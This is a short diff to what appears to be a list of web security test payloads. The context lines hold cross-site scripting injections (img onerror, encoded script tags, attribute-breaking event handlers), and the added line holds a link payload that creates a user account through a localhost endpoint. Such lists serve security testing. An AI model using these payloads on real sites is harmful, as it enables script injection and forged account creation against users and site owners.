@@ -48,7 +48,7 @@ postId=2&comment=<><img src=1 onerror=alert(1)>
 postId=2&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
 imageClass=" src=1 onerror=alert(1)>
 imageClass=" onmouseleave='alert(1)'">
-
+title=<a href="http://localhost/newUser?username=test&password=test">test</a>&comment=hello
 
 <!-- -------------------------------------------------------------------- -->
 
